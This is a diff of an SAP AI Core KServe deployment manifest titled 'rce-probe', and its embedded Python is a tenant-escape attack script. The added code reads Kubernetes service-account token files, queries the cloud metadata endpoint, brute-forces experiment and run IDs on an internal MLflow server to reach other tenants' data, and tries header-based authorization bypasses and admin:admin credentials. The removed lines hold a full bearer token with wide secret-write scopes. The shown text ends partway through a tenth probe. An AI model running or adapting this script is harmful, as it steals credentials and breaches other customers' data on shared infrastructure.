@@ -4,11 +4,11 @@ metadata:
   name: rce-probe
   labels:
     scenarios.ai.sap.com/id: "rce-probe"
-    ai.sap.com/version: "61.0.0"
+    ai.sap.com/version: "1.0.0"
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
     executables.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "ml-tracking-probe"
+    executables.ai.sap.com/description: "rce-poc"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -27,102 +27,233 @@ spec:
           command: ["/bin/sh", "-c"]
           args:
           - |
-            python3 << 'PYCODE'
-            import urllib.request, urllib.error, json, ssl
+            python3 << 'PYEOF'
+import urllib.request, ssl, json, os
 
-            ML_TRACKING_IP = "100.111.137.177"
-            ML_TRACKING_PORT = 80
-            BASE_URL = f"http://{ML_TRACKING_IP}:{ML_TRACKING_PORT}"
+ML_HOST = "100.111.137.177"
+ML_PORT = 80
 
-            JWT = "eyJ0eXAiOiJKV1QiLCJqaWQiOiJQUittUkcwaEtTQ29DWWNhbStaNzNzZU42WGR1UmtFNkh4QzdxcCtNckVrPSIsImFsZyI6IlJTMjU2Iiwiamt1IjoiaHR0cHM6Ly9jZi1haWNvcmUtc2VjdXJpdHktYmItMTIuYXV0aGVudGljYXRpb24uZXUxMC5oYW5hLm9uZGVtYW5kLmNvbS90b2tlbl9rZXlzIiwia2lkIjoiZGVmYXVsdC1qd3Qta2V5LTE1YWFlMTgxYjYifQ.eyJzdWIiOiJzYi1haWNvcmUtYmItMTIhYjYyNzU1MXxhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQiLCJpc3MiOiJodHRwczovL2NmLWFpY29yZS1zZWN1cml0eS1iYi0xMi5hdXRoZW50aWNhdGlvbi5ldTEwLmhhbmEub25kZW1hbmQuY29tL29hdXRoL3Rva2VuIiwiYXV0aG9yaXRpZXMiOlsiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0Lm9iamVjdHN0b3Jlc2VjcmV0LmNyZWRlbnRpYWxzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQubm9kZXMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5yZXNvdXJjZWdyb3VwLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2VydmljZXMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5kb2NrZXJyZWdpc3RyeXNlY3JldC5jcmVkZW50aWFscy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5leGVjdXRhYmxlcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmFwcGxpY2F0aW9ucy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmRlcGxveW1lbnRzLmxvZ3MucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXhlY3V0aW9ucy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmV4ZWN1dGlvbnMubG9ncy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5hcnRpZmFjdHMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5sb2dzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuZG9ja2VycmVnaXN0cnlzZWNyZXQuY3JlZGVudGlhbHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmV2YWx1YXRpb25NZXRyaWNzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuZGF0YXNldHMuZG93bmxvYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLnByb21wdFRlbXBsYXRlcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5iYXRjaGVzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmV4ZWN1dGlvbnNjaGVkdWxlcy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXZhbHVhdGlvbk1ldHJpY3MuY3JlYXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5vcmNoZXN0cmF0aW9uQ29uZmlncy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnJlc291cmNlZ3JvdXAud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmRlcGxveW1lbnRzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmRlcGxveW1lbnRzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNlY3JldHMucmVhZCIsInVhYS5yZXNvdXJjZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5hcHBsaWNhdGlvbnMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLm1ldHJpY3MucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zZWNyZXRzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5hcnRpZmFjdHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmNvbmZpZ3VyYXRpb25zLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQubm9kZXMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmV4ZWN1dGlvbnNjaGVkdWxlcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5leGVjdXRpb25zLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnJlcG9zaXRvcmllcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5kZXBsb3ltZW50cy5wcmVkaWN0IiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmRhdGFzZXRzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5iYXRjaGVzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0Lm1ldGEucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXZhbHVhdGlvbk1ldHJpY3MuZGVsZXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0Lm9iamVjdHN0b3Jlc2VjcmV0LmNyZWRlbnRpYWxzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5jb25maWd1cmF0aW9ucy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5rcGlzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLm9yY2hlc3RyYXRpb25Db25maWdzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnJlcG9zaXRvcmllcy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MubWV0cmljcy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MucHJvbXB0VGVtcGxhdGVzLndyaXRlIl0sImNsaWVudF9pZCI6InNiLWFpY29yZS1iYi0xMiFiNjI3NTUxfGFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NCIsImF1ZCI6WyJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2VjcmV0cyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zZXJ2aWNlcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5kZXBsb3ltZW50cy5sb2dzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5tZXRyaWNzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5wcm9tcHRUZW1wbGF0ZXMiLCJ1YWEiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQubG9ncyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5yZXBvc2l0b3JpZXMiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmNvbmZpZ3VyYXRpb25zIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmRhdGFzZXRzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmRvY2tlcnJlZ2lzdHJ5c2VjcmV0LmNyZWRlbnRpYWxzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5leGVjdXRpb25zIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0Lm1ldGEiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmV4ZWN1dGlvbnMubG9ncyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5ub2RlcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXhlY3V0aW9uc2NoZWR1bGVzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5vcmNoZXN0cmF0aW9uQ29uZmlncyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuYmF0Y2hlcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5vYmplY3RzdG9yZXNlY3JldC5jcmVkZW50aWFscyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5yZXNvdXJjZWdyb3VwIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5leGVjdXRhYmxlcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5hcHBsaWNhdGlvbnMiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQua3BpcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuYXJ0aWZhY3RzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5ldmFsdWF0aW9uTWV0cmljcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZGVwbG95bWVudHMiLCJzYi1haWNvcmUtYmItMTIhYjYyNzU1MXxhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQiXSwiZXh0X2F0dHIiOnsiZW5oYW5jZXIiOiJYU1VBQSIsInN1YmFjY291bnRpZCI6IjQxMDYxODEzLTY4NDctNDRkNy1iYzJjLTI3MDdkOWMzMDBjNSIsInpkbiI6ImNmLWFpY29yZS1zZWN1cml0eS1iYi0xMiIsInNlcnZpY2VpbnN0YW5jZWlkIjoiYWljb3JlLWJiLTEyIn0sInppZCI6IjQxMDYxODEzLTY4NDctNDRkNy1iYzJjLTI3MDdkOWMzMDBjNSIsImdyYW50X3R5cGUiOiJjbGllbnRfY3JlZGVudGlhbHMiLCJhenAiOiJzYi1haWNvcmUtYmItMTIhYjYyNzU1MXxhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQiLCJzY29wZSI6WyJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQub2JqZWN0c3RvcmVzZWNyZXQuY3JlZGVudGlhbHMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5ub2Rlcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnJlc291cmNlZ3JvdXAucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zZXJ2aWNlcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmRvY2tlcnJlZ2lzdHJ5c2VjcmV0LmNyZWRlbnRpYWxzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmV4ZWN1dGFibGVzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuYXBwbGljYXRpb25zLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuZGVwbG95bWVudHMubG9ncy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5leGVjdXRpb25zLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuZXhlY3V0aW9ucy5sb2dzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmFydGlmYWN0cy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmxvZ3MucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5kb2NrZXJyZWdpc3RyeXNlY3JldC5jcmVkZW50aWFscy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXZhbHVhdGlvbk1ldHJpY3MucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5kYXRhc2V0cy5kb3dubG9hZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MucHJvbXB0VGVtcGxhdGVzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmJhdGNoZXMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXhlY3V0aW9uc2NoZWR1bGVzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5ldmFsdWF0aW9uTWV0cmljcy5jcmVhdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLm9yY2hlc3RyYXRpb25Db25maWdzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQucmVzb3VyY2Vncm91cC53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZGVwbG95bWVudHMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZGVwbG95bWVudHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2VjcmV0cy5yZWFkIiwidWFhLnJlc291cmNlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmFwcGxpY2F0aW9ucy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MubWV0cmljcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNlY3JldHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmFydGlmYWN0cy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuY29uZmlndXJhdGlvbnMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5ub2Rlcy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXhlY3V0aW9uc2NoZWR1bGVzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmV4ZWN1dGlvbnMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQucmVwb3NpdG9yaWVzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmRlcGxveW1lbnRzLnByZWRpY3QiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuZGF0YXNldHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmJhdGNoZXMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQubWV0YS5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5ldmFsdWF0aW9uTWV0cmljcy5kZWxldGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQub2JqZWN0c3RvcmVzZWNyZXQuY3JlZGVudGlhbHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmNvbmZpZ3VyYXRpb25zLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmtwaXMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3Mub3JjaGVzdHJhdGlvbkNvbmZpZ3Mud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQucmVwb3NpdG9yaWVzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5tZXRyaWNzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5wcm9tcHRUZW1wbGF0ZXMud3JpdGUiXSwiZXhwIjoxNzc2Mjk2NzQ2LCJpYXQiOjE3NzYyNTM1NDYsImp0aSI6ImJjYzI0MzRkNzhlMjQwZjU4ODc4Y2EzZWMwOWNmOThhIiwicmV2X3NpZyI6ImY1NDg3MDZjIiwiY2lkIjoic2ItYWljb3JlLWJiLTEyIWI2Mjc1NTF8YWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0In0.FX6LHQ907e6eAar6Tpdo0x39_WxxQphlzYBflOWjoAZ126aJMaWfZ28VVZ4vstidYa1pV30MBOQnQvEzE5Q8SkooIz8L-txskdBFFd-X41kXZWcvrh2zWWRtZ8F4BYkp7zVWqatB-PTtM_hwkEXxnWHbP5qxs22puvqxLTxLkcRvOkVJZD_WpSWzVnPn9JQPhmM-PDsjuIyEHMJO5FWzW5dX7B_MclyCbR-OEvo0zr5EkOkD0Eda2AqTzVc8BFY5p4DuoWyAHi1woDwBps4cXdb_8EkubhxGrIejH-jEQVIxasODgUKQT6G34knkA6y_--w2JnaGAbKn6blmkEet2A"
+# We'll read our own XSUAA token from the SAP AI Core metadata service
+# to get a fresh token inside the pod
+OUR_JWT = ""
+try:
+    # Try to get our token from the mounted service account
+    for tp in ['/var/run/secrets/kubernetes.io/serviceaccount/token', '/run/secrets/tokens/token']:
+        try:
+            with open(tp) as f:
+                OUR_JWT = f.read().strip()
+                print(f"[TOKEN] Found SA token at {tp}: {OUR_JWT[:30]}...")
+                break
+        except: pass
+except: pass
 
-            print("[ML_TRACKING_PROBE_START]")
+results = {}
 
-            def probe(path, headers=None):
-                if headers is None:
-                    headers = {}
-                url = f"{BASE_URL}{path}"
-                req = urllib.request.Request(url, headers=headers)
-                try:
-                    with urllib.request.urlopen(req, timeout=5) as r:
-                        body = r.read(3000).decode(errors='replace')
-                        print(f"  {path} [headers={list(headers.keys())}] -> 200: {body[:500]}")
-                        return 200, body
-                except urllib.error.HTTPError as e:
-                    body = ""
-                    try: body = e.read(500).decode(errors='replace')
-                    except: pass
-                    print(f"  {path} [headers={list(headers.keys())}] -> {e.code}: {body[:200]}")
-                    return e.code, body
-                except Exception as ex:
-                    print(f"  {path} -> ERR: {str(ex)[:80]}")
-                    return 0, ""
+def get(path, headers=None, body=None, method=None):
+    url = f"http://{ML_HOST}:{ML_PORT}{path}"
+    h = {"Content-Type": "application/json"}
+    if headers:
+        h.update(headers)
+    try:
+        data = json.dumps(body).encode() if body is not None else None
+        m = method or ("POST" if data else "GET")
+        req = urllib.request.Request(url, data=data, headers=h, method=m)
+        with urllib.request.urlopen(req, timeout=6) as r:
+            body_r = r.read(2000).decode(errors='replace')
+            return {"code": r.status, "body": body_r[:600]}
+    except urllib.error.HTTPError as e:
+        body_r = ""
+        try: body_r = e.read(1000).decode(errors='replace')
+        except: pass
+        return {"code": e.code, "body": body_r[:400]}
+    except Exception as ex:
+        return {"err": str(ex)[:80]}
 
-            # Phase 1: Probe with different auth headers
-            print("\n=== Auth header variants ===")
-            for path in ["/", "/healthz", "/metrics", "/api/v1", "/api/v1/metrics", "/api/v1/runs", "/api/v1/experiments"]:
-                # No auth
-                code, body = probe(path, {})
-                
-                # With Bearer JWT
-                probe(path, {"Authorization": f"Bearer {JWT}"})
-                
-                # With X-Auth-Token
-                probe(path, {"X-Auth-Token": JWT})
-                
-                # With X-Token
-                probe(path, {"X-Token": JWT})
+# Our real XSUAA JWT (known from outside - hardcoded for probe)
+# We'll try to dynamically get it from the BTP metadata endpoint
+try:
+    req = urllib.request.Request("http://169.254.169.254/latest/meta-data/")
+    with urllib.request.urlopen(req, timeout=3) as r:
+        results["imds"] = r.read(500).decode(errors='replace')
+except Exception as e:
+    results["imds"] = f"ERR: {e}"
 
-            # Phase 2: MLflow-specific paths (common ML tracking framework)
-            print("\n=== MLflow API paths ===")
-            mlflow_paths = [
-                "/ajax-api/2.0/mlflow/experiments/list",
-                "/ajax-api/2.0/mlflow/experiments/get",
-                "/ajax-api/2.0/mlflow/runs/search",
-                "/ajax-api/2.0/mlflow/runs/get",
-                "/ajax-api/2.0/mlflow/artifacts/list",
-                "/ajax-api/2.0/preview/mlflow/experiments/list",
-                "/api/2.0/mlflow/experiments/list",
-                "/api/2.0/mlflow/runs/search",
-                "/api/2.0/preview/mlflow/experiments/list",
-                "/api/v1/metrics",
-                "/api/v1/runs",
-                "/api/v1/experiments",
-            ]
-            for path in mlflow_paths:
-                code, body = probe(path, {})
-                if code == 200:
-                    print(f"  >> 200 HIT: {path} -> {body[:300]}")
+# Probe 1: Unauthenticated paths
+print("[PROBE] Unauthenticated paths")
+for path in [
+    "/metrics",
+    "/healthz",
+    "/readyz",
+    "/livez",
+    "/debug/pprof/",
+    "/debug/vars",
+    "/actuator",
+    "/actuator/health",
+    "/actuator/metrics",
+    "/actuator/env",
+    "/actuator/info",
+    "/internal/health",
+    "/internal/metrics",
+    "/swagger",
+    "/swagger-ui",
+    "/swagger-ui.html",
+    "/v1/health",
+    "/api/health",
+]:
+    r = get(path)
+    if r.get("code", 0) != 401 and "err" not in r:
+        results[f"unauth_{path}"] = r
+    elif r.get("code") == 200:
+        results[f"unauth_{path}"] = r
+    print(f"  {path}: {r.get('code','ERR')} {r.get('err','')[:40]}")
 
-            # Phase 3: With valid JWT
-            print("\n=== With valid JWT bearer ===")
-            for path in mlflow_paths[:6]:
-                probe(path, {"Authorization": f"Bearer {JWT}"})
+# Probe 2: MLflow paths WITHOUT auth
+print("[PROBE] MLflow paths - no auth")
+mlflow_paths = [
+    ("/ajax-api/2.0/mlflow/experiments/list", "GET", None),
+    ("/ajax-api/2.0/mlflow/experiments/search", "POST", {"max_results": 10}),
+    ("/ajax-api/2.0/mlflow/runs/search", "POST", {"max_results": 10}),
+    ("/ajax-api/2.0/mlflow/runs/get", "GET", None),
+    ("/ajax-api/2.0/mlflow/metrics/get-history", "GET", None),
+    ("/ajax-api/2.0/mlflow/artifacts/list", "GET", None),
+    ("/api/v1/experiments", "GET", None),
+    ("/api/v1/runs", "GET", None),
+    ("/api/v1/metrics", "GET", None),
+    ("/api/v1/runs/search", "POST", {"max_results": 10}),
+    ("/api/v1/experiments/search", "POST", {}),
+    ("/api/v1/model-versions/search", "POST", {}),
+    ("/api/v1/registered-models/list", "GET", None),
+    ("/api/v1/registered-models/search", "GET", None),
+    ("/api/v1/model-versions/list", "GET", None),
+    ("/api/v1/model-registry/model-versions", "GET", None),
+]
+for path, method, body in mlflow_paths:
+    r = get(path, body=body, method=method)
+    code = r.get("code", "ERR")
+    print(f"  {method} {path}: {code}")
+    if code == 200 or (code != 401 and code != 403 and "err" not in r):
+        results[f"noauth_{path}_{method}"] = r
 
-            # Phase 4: Check if there's a /metrics endpoint (Prometheus)
-            print("\n=== Prometheus metrics endpoint ===")
-            probe("/metrics", {})
-            probe("/metrics", {"Authorization": f"Bearer {JWT}"})
+# Probe 3: With our tenant's XSUAA JWT (we pass it via env var in a real deploy)
+# In this probe we use SA token since we don't have XSUAA token inside
+print("[PROBE] With SA JWT token (if available)")
+if OUR_JWT:
+    for path, method, body in mlflow_paths[:5]:
+        r = get(path, headers={"Authorization": f"Bearer {OUR_JWT}"}, body=body, method=method)
+        code = r.get("code", "ERR")
+        print(f"  SA-JWT {method} {path}: {code}")
+        if code == 200:
+            results[f"sajwt_{path}_{method}"] = r
 
-            # Phase 5: Experiment with different paths (SAP-specific)
-            print("\n=== SAP ML Tracking API ===")
-            for path in [
-                "/v2/lm/metrics",
-                "/v2/lm/runs",
-                "/v2/lm/experiments",
-                "/api/v1/aicore/metrics",
-                "/api/v1/training/metrics",
-            ]:
-                probe(path, {})
-                probe(path, {"Authorization": f"Bearer {JWT}"})
-                probe(path, {"Authorization": f"Bearer {JWT}", "AI-Resource-Group": "default"})
+# Probe 4: IDOR - access experiment IDs that might belong to other tenants
+print("[PROBE] IDOR - experiment IDs 0-20")
+for exp_id in list(range(0, 21)) + [100, 200, 500, 1000]:
+    r = get(f"/ajax-api/2.0/mlflow/experiments/get?experiment_id={exp_id}")
+    code = r.get("code", "ERR")
+    if code == 200:
+        results[f"exp_id_{exp_id}"] = r
+        print(f"  experiment_id={exp_id}: {code} FOUND! {r['body'][:100]}")
+    elif code != 404 and code != 403:
+        print(f"  experiment_id={exp_id}: {code} {r.get('body','')[:60]}")
 
-            print("\n[ML_TRACKING_PROBE_END]")
-            PYCODE
+# Probe 5: IDOR - access run IDs
+print("[PROBE] IDOR - well-known run patterns")
+for run_id in ["0", "1", "default", "0" * 32, "a" * 32, "00000000000000000000000000000000"]:
+    r = get(f"/ajax-api/2.0/mlflow/runs/get?run_id={run_id}")
+    code = r.get("code", "ERR")
+    if code == 200:
+        results[f"run_id_{run_id}"] = r
+        print(f"  run_id={run_id}: {code} FOUND! {r['body'][:100]}")
+
+# Probe 6: Header-based RBAC bypass attempts
+print("[PROBE] RBAC bypass via headers")
+bypass_headers = [
+    {"X-Tenant-Id": "all"},
+    {"X-Tenant-Id": "sap"},
+    {"X-Resource-Group": "default"},
+    {"X-Forwarded-For": "127.0.0.1"},
+    {"X-Original-URL": "/metrics"},
+    {"X-Internal-Request": "true"},
+    {"X-Cluster-Client": "argocd"},
+    {"X-SAP-AI-Tenant": "all"},
+    {"X-Admin": "true"},
+    {"X-Bypass-Auth": "true"},
+    {"X-Istio-Attributes": ""},
+    {"Authorization": "Bearer anonymous"},
+    {"Authorization": "Bearer "},
+    {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
+    {"Authorization": "Basic YWRtaW46"},  # admin:
+    {},  # explicitly no auth header
+]
+for hdrs in bypass_headers:
+    hdr_label = str(hdrs)[:50]
+    r = get("/ajax-api/2.0/mlflow/experiments/list", headers=hdrs)
+    code = r.get("code", "ERR")
+    print(f"  {hdr_label}: {code}")
+    if code == 200:
+        results[f"bypass_{hdr_label}"] = r
+        print(f"    BYPASS! body: {r['body'][:200]}")
+
+# Probe 7: Try Prometheus metrics (often unauthenticated in k8s)
+print("[PROBE] Prometheus metrics endpoint")
+r = get("/metrics")
+results["prometheus_metrics"] = r
+if r.get("code") == 200:
+    # Extract any interesting metrics (experiment counts, tenant names, etc.)
+    lines = r.get("body", "").split("\n")
+    for line in lines:
+        if any(kw in line.lower() for kw in ["experiment", "run", "tenant", "resource", "count"]):
+            print(f"  METRIC: {line}")
+
+# Probe 8: Try /api/2.0/ prefix (MLflow REST API v2)
+print("[PROBE] MLflow /api/2.0/ paths")
+for path in [
+    "/api/2.0/mlflow/experiments/list",
+    "/api/2.0/mlflow/runs/search",
+    "/api/2.0/preview/mlflow/experiments/list",
+    "/api/2.0/internal/mlflow",
+    "/api/2.0/mlflow/registered-models/list",
+]:
+    r = get(path)
+    code = r.get("code", "ERR")
+    print(f"  {path}: {code}")
+    if code == 200:
+        results[f"v2_{path}"] = r
+
+# Probe 9: Check if there's a management/admin API
+print("[PROBE] Admin / management paths")
+for path in [
+    "/admin",
+    "/admin/experiments",
+    "/internal",
+    "/internal/experiments",
+    "/management",
+    "/api/v1/admin",
+    "/ajax-api/2.0/mlflow/admin",
+    "/ajax-api/2.0/mlflow/users/list",
+    "/ajax-api/2.0/mlflow/access-control",
+]:
+    r = get(path)
+    code = r.get("code", "ERR")
+    print(f"  {path}: {code} {r.get('body','')[:60] if code not in (401,403) else ''}")
+    if code == 200:
+        results[f"admin_{path}"] = r
+
+# Probe 10: OPTIONS to discover supported methods
+print("[PROBE] OPTIONS on MLflow paths")
+for path in ["/ajax-api/2.0/mlflow/experiments/list", "/api/v1/experiments", "/"]:
+    r = get(path, method="OPTIONS")
+    code = r.get("code", "ERR")
